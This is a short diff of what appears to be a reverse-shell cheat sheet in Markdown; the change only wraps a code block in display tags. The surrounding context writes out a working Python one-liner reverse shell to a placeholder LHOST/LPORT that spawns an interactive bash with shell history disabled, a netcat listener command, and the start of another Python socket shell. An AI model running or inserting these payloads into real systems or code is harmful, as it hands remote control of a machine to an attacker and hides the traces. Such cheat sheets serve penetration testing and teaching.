@@ -37,10 +37,12 @@ nc -u -lvp 4242
 
 ### Python
 
+{% code overflow="wrap" %}
 ```bash
 # TCP
 python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn(['/bin/bash','-i']);s.close();exit();"
 ```
+{% endcode %}
 
 ```python
 import socket,subprocess,os
